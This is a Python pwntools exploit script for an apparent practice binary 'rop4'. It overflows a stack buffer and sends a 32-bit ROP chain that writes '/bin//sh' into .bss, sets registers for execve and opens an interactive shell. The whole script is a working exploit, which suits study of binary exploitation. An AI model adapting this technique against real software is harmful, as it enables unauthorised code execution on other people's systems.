from pwn import *

io = process('./rop4')

gdb.attach(io)

payload = ''
payload += 'A' *0x88
payload += 'B' *4
#payload += 'CCCC'


bss = 0x80efc80

ropchain = ''
ropchain += p32(0x080c28c6)
ropchain += '/bin'
ropchain += p32(0x080551ca)
ropchain += p32(int(bss))    #write /bin to bss
ropchain += p32(0x0808ee3d)
ropchain += p32(0x080c28c6)
ropchain += '//sh'           #write //sh to bss
ropchain += p32(0x080551ca)
ropchain += p32(int(bss)+4)
ropchain += p32(0x0808ee3d)  #mov dword ptr [edx], eax ; ret

ropchain += p32(0x080c28c6)  #write the pointer to /bin/sh to bss
ropchain += p32(int(bss))
ropchain += p32(0x080551ca)
ropchain += p32(int(bss)+12)
ropchain += p32(0x0808ee3d)  #mov dword ptr [edx], eax ; ret

ropchain += p32(0x080512c0)  #xor eax,eax ; ret
ropchain += p32(0x0809af27)  #xchg eax, edx ; ret 

ropchain += p32(0x080512c0)  #xor eax
ropchain += p32(0x080551ca)
ropchain += p32(0x080efc88)  #add null bytes to the end of /bin/sh
ropchain += p32(0x0808ee3d)

ropchain += p32(0x080481ec)  #load /bin/sh to ebx
ropchain += p32(int(bss))

ropchain += p32(0x080e3c2a)  #load pointer to /bin/sh to ecx
ropchain += p32(int(bss)+12)


ropchain += p32(0x080ac170)  #mov eax,7 ; ret
ropchain += p32(0x0809a93f)  #inc eax ; ret 
ropchain += p32(0x0809a93f)
ropchain += p32(0x0809a93f)
ropchain += p32(0x0809a93f)  #increment eax to 0xb  

ropchain += p32(0x08049449)

io.sendline(payload+ropchain)

io.interactive()
